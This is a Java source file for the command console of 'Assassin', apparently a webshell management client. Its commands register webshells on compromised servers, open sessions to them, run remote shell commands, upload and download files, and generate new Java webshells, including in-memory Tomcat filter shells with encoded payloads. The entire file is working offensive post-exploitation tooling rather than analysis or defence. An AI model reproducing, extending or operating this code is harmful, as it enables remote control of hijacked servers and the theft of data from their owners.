package org.b1ackc4t.main;

import com.alibaba.fastjson.JSONObject;

import java.io.File;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.sql.SQLException;
import java.util.*;

import org.b1ackc4t.sender.Crypt;
import org.b1ackc4t.util.*;
import org.b1ackc4t.sender.Sender;
import org.b1ackc4t.webshell.JavaTemplate;

import javax.swing.JFileChooser;

public class Console extends Cmd {

    private DBManager db;
    private int session_id;
    private Sender sender;
    private final String label;
    private String current_path;
    private String os;
    private String pathSep;
    private String type;
    private final String[] commands = {"Hello","Add","Help","Show","Delete","Session","Back", "Getshell", "Upload", "Download", "Reset", "New", "Set"};
    private final Map<String, String> headers;


    public Console() {
        super();
        db = DBManager.db;
        headers = Config.headers;
        label = "Assassin";
        prompt = label + " >";
        session_id = 0;
        current_path = "";
    }

    public boolean doHello(String[] args, Map<String, String> kwargs) {
        System.out.println("hello");
        return false;
    }

    /**
     * 添加一个webshell
     * @param args
     * @return
     */
    public boolean doAdd(String[] args, Map<String, String> kwargs) {
        if (args == null || args.length < 2) {
            System.out.println("too few arguments");
            return false;
        }

        String shell_url = args[0];
        String pass = args[1];
        String type = (args.length > 2) ? args[2] : "java";
        String method = (args.length > 3) ? args[3] : "post";
        String reqEncode = (args.length > 4) ? args[4] : "base64";
        String resEncode = (args.length > 5) ? args[5] : "base64";
        String note = (args.length > 6) ? args[6] : "";
        type = kwargs.getOrDefault("type", type);
        method = kwargs.getOrDefault("method", method);
        reqEncode = kwargs.getOrDefault("reqencode", reqEncode);
        resEncode = kwargs.getOrDefault("resencode", resEncode);
        note = kwargs.getOrDefault("note", note);
        Sender sender_temp = new Sender(shell_url, pass, type, method, headers);
        sender_temp.reqEncode = reqEncode;
        sender_temp.resEncode = resEncode;
        if (db.isExist(shell_url)){
            System.out.println("webshell already exists");
            return false;
        }
        if (sender_temp.testCon()) {
            try {
                db.addWebshell(shell_url, pass, type, method, reqEncode, resEncode, note);
                int id_temp = db.getEndID();
                db.changeShell(id_temp, "status", "1");
                System.out.println("OK");
            } catch (SQLException | ClassNotFoundException e) {
                e.printStackTrace();
            }
        } else {
            System.out.println("Connection Failure");
        }
        return false;
    }

    /**
     * 展示所有webshell列表
     * @param args
     * @return
     */
    public boolean doShow(String[] args, Map<String, String> kwargs) {
        try {
            db.showAll();
        } catch (ClassNotFoundException | SQLException e) {
            e.printStackTrace();
        }
        return false;
    }

    public boolean doDelete(String[] args, Map<String, String> kwargs) {
        if (args == null || args.length < 1) {
            System.out.println("too few arguments");
            return false;
        }
        int id = Integer.parseInt(args[0]);
        try {
            db.deleteWebShell(id);
            System.out.println("OK");
        } catch (SQLException | ClassNotFoundException e) {
            System.out.println("ID does not exist");
        }
        return false;
    }

    public boolean doSet(String[] args, Map<String, String> kwargs) {
        if (args == null || args.length < 3) {
            System.out.println("too few arguments");
            return false;
        }
        int id = Integer.parseInt(args[0]);
        String key = args[1];
        String newValue = args[2];
        if (db.changeShell(id, key, newValue)) {
            System.out.println("OK");
        } else {
            System.out.println("fail");
        }
        return false;
    }

    /**
     * 展示帮助信息
     * @param args
     * @return
     */
    public boolean doHelp(String[] args, Map<String, String> kwargs) {

        if (args != null && args.length > 0) {
            switch (args[0]) {
                case "new":
                    System.out.println("Usage:");
                    System.out.println("\t" + Config.getYColor("new")+ " java|php|asp password [method] [reqEncode] [tamper]");
                    System.out.println("=================================================");
                    System.out.println("generate webshell, only java temporarily");
                    System.out.println(Config.getYColor("method:") + " Sending mode of payload(value: get|post|mixed|cookie)");
                    System.out.println(Config.getYColor("reqEncode:") + " request encoding(value: hex|base36|base64)");
                    System.out.println(Config.getYColor("tamper:") + " Predefined template");
                    System.out.format("%15s%s --%s%n", "value: ", "common.txt (default)", "common webshell");
                    System.out.format("%15s%s --%s%n", "", "tomcat7_filter.txt", "memory webshell for tomcat7");
                    System.out.format("%15s%s --%s%n", "", "tomcat8_filter.txt", "memory webshell for tomcat8");
                    System.out.format("%15s%s --%s%n", "", "tomcat9_filter.txt", "memory webshell for tomcat9");
                    System.out.format("%15s%s%n", "", "You can write your own tamper in './webshell'");
                    System.out.println("=================================================");
                    System.out.println("Example:");
                    System.out.println("\t" + Config.getYColor("new") + " java 123456 post reqEncode=base36");
                    break;
                case "upload":
                    System.out.println("Usage:");
                    System.out.println("\t" + Config.getYColor("upload") + " [remotePath]");
                    System.out.println("=================================================");
                    System.out.println("Upload the file to the server, can only be used after obtaining session.");
                    System.out.println(Config.getYColor("remotePath:") + " Server target filepath(default: Current path)");
                    System.out.println("=================================================");
                    System.out.println("Example:");
                    System.out.println("\t" + Config.getYColor("upload") + " /var/www/html/1.txt");
                    break;
                case "download":
                    System.out.println("Usage:");
                    System.out.println("\t" + Config.getYColor("download") + " remotePath");
                    System.out.println("=================================================");
                    System.out.println("Download the server file, can only be used after obtaining session.");
                    System.out.println(Config.getYColor("remotePath:") + " Server target filepath");
                    System.out.println("=================================================");
                    System.out.println("Example:");
                    System.out.println("\t" + Config.getYColor("download") + " /var/www/html/1.txt");
                    break;
                case "add":
                    System.out.println("Usage:");
                    System.out.format("\t" + Config.getYColor("add"));
                    System.out.println(" url password [type] [method] [reqEncode] [resEncode] [note]");
                    System.out.println("=================================================");
                    System.out.println("add a webshell to db");
                    System.out.println(Config.getYColor("url:") + " target webshell url");
                    System.out.println(Config.getYColor("password:") + " target webshell password");
                    System.out.println(Config.getYColor("type:") + " webshell type(default: java;value: java)");
                    System.out.println(Config.getYColor("method:") + " Payload sending mode(default: post;value: get|post|mixed|cookie)");
                    System.out.println(Config.getYColor("reqEncode:") + " Payload request encoding(default: base64;value: hex|base36|base64)");
                    System.out.println(Config.getYColor("resEncode:") + " Payload response encoding(default: base64;value: raw|hex|base36|base64)");
                    System.out.println("=================================================");
                    System.out.println("Example:");
                    System.out.format("\t" + Config.getYColor("add"));
                    System.out.println(" http://127.0.0.1/a.jsp 123 java get hex");
                    System.out.format("\t" + Config.getYColor("add"));
                    System.out.println(" http://127.0.0.1/a.jsp 123 java method=cookie resEncode=base36");
                    break;
                case "session":
                    System.out.println("Usage:");
                    System.out.println("\t" + Config.getYColor("session") + " id");
                    System.out.println("=================================================");
                    System.out.println("Enter a webshell operation mode.");
                    System.out.println(Config.getYColor("id:") + " webshell id (tip: exec 'show')");
                    System.out.println("=================================================");
                    System.out.println("Example:");
                    System.out.println("\t" + Config.getYColor("session") + " 1");
                    break;
                case "set":
                    System.out.println("Usage:");
                    System.out.println("\t" + Config.getYColor("set") + " id key value");
                    System.out.println("=================================================");
                    System.out.println("modify params of webshell of db");
                    System.out.println(Config.getYColor("id:") + " webshell id (tip: exec 'show')");
                    System.out.println(Config.getYColor("key:") + " db's key");
                    System.out.println(Config.getYColor("value:") + " db's new value");
                    System.out.println("=================================================");
                    System.out.println("Example:");
                    System.out.println("\t" + Config.getYColor("set") + " 1 resEncode base36");
                    break;
                case "reset":
                    System.out.println("Usage:");
                    System.out.println("\t" + Config.getYColor("reset") + " id");
                    System.out.println("=================================================");
                    System.out.println("reset a webshell. Reload payload class information");
                    System.out.println(Config.getYColor("id:") + " webshell id (tip: exec 'show')");
                    System.out.println("=================================================");
                    System.out.println("Example:");
                    System.out.println("\t" + Config.getYColor("reset") + " 1");
                    break;
                case "getshell":
                    System.out.println("Usage:");
                    System.out.println("\t" + Config.getYColor("getshell"));
                    System.out.println("=================================================");
                    System.out.println("Enter shell command execution mode, can only be used after obtaining session.");
                    System.out.println("=================================================");
                    System.out.println("Example:");
                    System.out.println("\t" + Config.getYColor("getshell"));
                    break;
                case "exit":
                    System.out.println("Exit program");
                    break;
                case "show":
                    System.out.println("Show all webshell");
                    break;
                case "delete":
                    System.out.println("Usage:");
                    System.out.println("\t" + Config.getYColor("delete") + " id");
                    System.out.println("=================================================");
                    System.out.println("Delete a webshell");
                    System.out.println(Config.getYColor("id:") + " webshell id (tip: exec 'show')");
                    System.out.println("=================================================");
                    System.out.println("Example:");
                    System.out.println("\t" + Config.getYColor("delete") + " 1");
                    break;
                case "back":
                    System.out.println("Go back to the previous menu");
                    break;
            }
            return false;
        }

        System.out.println("Core Commands");
        System.out.println("=============");
        System.out.printf("%-14s", "\tCommand");
        System.out.printf("%-35s%n", "Description");
        System.out.printf("%-14s", "\t-------");
        System.out.printf("%-35s%n", "-----------");
        System.out.printf("%-25s", "\t" + Config.getYColor("help"));
        System.out.printf("%-35s%n", "View help information");
        System.out.printf("%-25s", "\t" + Config.getYColor("exit"));
        System.out.printf("%-35s%n", "Exit program");
        System.out.printf("%-25s", "\t" + Config.getYColor("show"));
        System.out.printf("%-35s%n", "Show all webshell");
        System.out.printf("%-25s", "\t" + Config.getYColor("add"));
        System.out.printf("%-35s%n", "Add a webshell");
        System.out.printf("%-25s", "\t" + Config.getYColor("delete"));
        System.out.printf("%-35s%n", "Delete a webshell");
        System.out.printf("%-25s", "\t" + Config.getYColor("set"));
        System.out.printf("%-35s%n", "Modify a webshell setting");
        System.out.printf("%-25s", "\t" + Config.getYColor("session"));
        System.out.printf("%-35s%n", "Get a webshell controller");
        System.out.printf("%-25s", "\t" + Config.getYColor("reset"));
        System.out.printf("%-35s%n", "Reset webshell classload info");
        System.out.printf("%-25s", "\t" + Config.getYColor("new"));
        System.out.printf("%-35s%n", "Generate a webshell");
        System.out.println();

        System.out.println("Webshell Controller Commands");
        System.out.println("============================");
        System.out.printf("%-14s", "\tCommand");
        System.out.printf("%-35s%n", "Description");
        System.out.printf("%-14s", "\t-------");
        System.out.printf("%-35s%n", "-----------");
        System.out.printf("%-25s", "\t" + Config.getYColor("getshell"));
        System.out.printf("%-35s%n", "get remote shell");
        System.out.printf("%-25s", "\t" + Config.getYColor("upload"));
        System.out.printf("%-35s%n", "upload file to the server");
        System.out.printf("%-25s", "\t" + Config.getYColor("download"));
        System.out.printf("%-35s%n", "download file to the local");
        System.out.printf("%-25s", "\t" + Config.getYColor("back"));
        System.out.printf("%-35s%n", "Go back to the previous menu");
        System.out.println();

        System.out.println("b1ackc4t");
        System.out.println("========");
        System.out.println("\tYou can exec 'help [command]' to get more info. Such as 'help add'");

        return false;
    }

    public boolean doSession(String[] args, Map<String, String> kwargs) {
        if (args == null || args.length < 1) {
            System.out.println("too few arguments");
            return false;
        }
        int id = Integer.parseInt(args[0]);
        if (id > db.getEndID()) {
            System.out.println("session id not found!");
            return false;
        }
        String[] arr_temp = db.getShellInfo(id);
        String shell_url = arr_temp[0];
        String pass = arr_temp[1];
        type = arr_temp[2];
        String method = arr_temp[3];
        String reqEncode = arr_temp[4];
        String resEncode = arr_temp[5];
        sender = new Sender(shell_url, pass, type, method, headers);
        sender.resEncode = resEncode;
        sender.reqEncode = reqEncode;
        if (sender.testCon()) {
            session_id = Integer.parseInt(args[0]);
            prompt = label + "|" + type + " >";
            db.changeShell(session_id, "status", "1");
            System.out.println("OK");
        } else {
            sender = null;
            db.changeShell(session_id, "status", "0");
            System.out.println("Connection Failure");
        }

        return false;
    }

    public boolean doBack(String[] args, Map<String, String> kwargs) {
        if (!current_path.equals("")) {
            current_path = "";
            prompt = label + "|" + type + " >";
            System.out.println("OK");
            return false;
        }

        if (session_id != 0) {
            session_id = 0;
            sender = null;
            prompt = label + " >";
            System.out.println("OK");
            return false;
        }
        return false;

    }

    public boolean preCmd(Command command) {
        if(Arrays.asList(commands).contains(command.getCmd()) ) {
            return false;
        }
        if (!current_path.equals("")) {
            try {
                Charset charSet = null;
                if (os.equals("windows")) {
                    charSet = Charset.forName("GBK");
                } else {
                    charSet = StandardCharsets.UTF_8;
                }
                String cmd =command.getRaw();
                if (command.getCmd().equals("Cd")) {
                    String tmpCmd = null;
                    if (os.equals("windows")) {
                        tmpCmd = cmd + "& chdir";
                    } else {
                        tmpCmd = cmd + "& pwd";
                    }
                    JSONObject result_json = sender.rce(tmpCmd);
                    if (result_json.getString("status").equals("c3VjY2Vzcw==")) {
                        System.out.println("success");
                        current_path = new String(Crypt.b64Decoder.decode(result_json.getString("msg")), charSet).trim();
                        prompt = label + "|" + type + "|" + current_path + " >";
                        return true;
                    } else {
                        System.out.printf("fail! message: %s%n", new String(Crypt.b64Decoder.decode(result_json.getString("msg"))));
                        return true;
                    }
                } else {
                    JSONObject result_json = sender.rce("cd " + current_path + " & " + cmd);
                    if (result_json.getString("status").equals("c3VjY2Vzcw==")) {
                        System.out.println(new String(Crypt.b64Decoder.decode(result_json.getString("msg")), charSet));
                        return true;
                    } else {
                        System.out.printf("fail! message: %s%n", new String(Crypt.b64Decoder.decode(result_json.getString("msg"))));
                        return false;
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
                return false;
            }
        }
        return false;
    }

    private String getCurrent_path()
    {
        JSONObject result_json = sender.rce("uname -a");
        if (result_json.getString("status").equals("c3VjY2Vzcw==")) {
            if(new String(Crypt.b64Decoder.decode(result_json.getString("msg"))).contains("Linux"))
            {
                current_path = new String(Crypt.b64Decoder.decode(sender.rce("pwd").getString("msg")));
                os = "linux";
                pathSep = "/";
            }
            else {
                current_path = new String(Crypt.b64Decoder.decode(sender.rce("chdir").getString("msg")));
                os = "windows";
                pathSep = "\\";
            }
            return  current_path.trim();
        } else {
            System.out.printf("fail! message: %s%n", new String(Crypt.b64Decoder.decode(result_json.getString("msg"))));
            return null;
        }
    }

    public boolean doGetshell(String[] args, Map<String, String> kwargs) {
        if (session_id == 0) {
            System.out.println("Please enter a session(session [id])");
            return false;
        }
        String res = getCurrent_path();
        if (res != null) {
            current_path = res;
            prompt = label + "|" + type + "|" + current_path + " >";
            System.out.println("OK! you can now execute the shell command.");
        }
        return false;

    }

    public boolean doUpload(String[] args, Map<String, String> kwargs) {
        if (session_id == 0) {
            System.out.println("Please enter a session(session [id])");
            return false;
        }
        JFileChooser fd = new JFileChooser();
        fd.setCurrentDirectory(new File("."));
        fd.setDialogTitle("请选择要上传的文件");
        fd.showOpenDialog(null);
        File f = fd.getSelectedFile();
        String remotePath = (args != null && args.length > 0) ? args[0] : current_path + pathSep + f.getName();
        JSONObject res = sender.upload(f.getAbsolutePath(), remotePath);
        if (res.getString("status").equals("c3VjY2Vzcw==")) {
            System.out.println(f.getAbsolutePath() + " has been uploaded -> " + remotePath);
        } else {
            System.out.printf("fail! message: %s%n", new String(Crypt.b64Decoder.decode(res.getString("msg"))));
        }
        return false;
    }

    public boolean doDownload(String[] args, Map<String, String> kwargs) {
        if (session_id == 0) {
            System.out.println("Please enter a session(session [id])");
            return false;
        }
        if (args == null || args.length < 1) {
            System.out.println("too few arguments");
            return false;
        }

        String remote_path = args[0];
        JSONObject result = sender.download(remote_path);
        if (result.getString("status").equals("c3VjY2Vzcw==")) {
            JFileChooser fd = new JFileChooser();
            fd.setCurrentDirectory(new File("."));
            fd.setDialogTitle("请输入要保存的文件名");
            fd.showOpenDialog(null);
            File f = fd.getSelectedFile();
            if (Utils.writeFileByBytes(f, Crypt.b64Decoder.decode(result.getString("msg")))) {
                System.out.println(remote_path + " has been saved -> " + f.getAbsolutePath());
            } else {
                System.out.println("fail!");
            }
        } else {
            System.out.printf("fail! message: %s%n", new String(Crypt.b64Decoder.decode(result.getString("msg"))));
        }
        return false;
    }

    /**
     * 目标payload已经失效，让某个shell重新传输payload
     * @param args
     * @return
     */
    public boolean doReset(String[] args, Map<String, String> kwargs) {
        if (args == null || args.length < 1) {
            System.out.println("too few arguments");
            return false;
        }

        int ID = Integer.parseInt(args[0]);
        db.resetClassInfo(ID);
        System.out.println("OK");
        return false;
    }

    public boolean doNew(String[] args, Map<String, String> kwargs) {
        if (args == null || args.length < 2) {
            System.out.println("too few arguments");
            return false;
        }

        String type = args[0].toLowerCase();
        String pass = args[1];
        String method = (args.length > 2) ? args[2].toLowerCase() : "post";
        String reqEncode = (args.length > 3) ? args[3].toLowerCase() : "base64_1";
        String tamper = (args.length > 4) ? args[4].toLowerCase() : "common.txt";
        method = kwargs.getOrDefault("method", method);
        reqEncode = kwargs.getOrDefault("reqencode", reqEncode);
        tamper = kwargs.getOrDefault("tamper", tamper);
        String webshellCode = null;
        if (type.equals("java")) {
            switch (reqEncode) {
                case "base64_1":
                    webshellCode = JavaTemplate.javaBase64_1(pass, tamper, method);
                    break;
                case "base64_2":
                    webshellCode = JavaTemplate.javaBase64_2(pass, tamper, method);
                    break;
                case "base36":
                    webshellCode = JavaTemplate.javaBase36(pass, tamper, method);
                    break;
                case "hex":
                    webshellCode = JavaTemplate.javaHex(pass, tamper, method);
                    break;
                default:
                    System.out.println("unsupported reqEncode!");
                    return false;
            }
        } else {
            System.out.println("unsupported type!");
            return false;
        }
        if (webshellCode == null) return false;
        JFileChooser fd = new JFileChooser();
        fd.setCurrentDirectory(new File("."));
        fd.setDialogTitle("请输入要保存的文件名");
        fd.showOpenDialog(null);
        File f = fd.getSelectedFile();
        if (Utils.writeFileByString(f, webshellCode)) {
            System.out.println("saved -> " + f.getAbsolutePath());
        } else {
            System.out.println("fail!");
        }

        return false;
    }
}
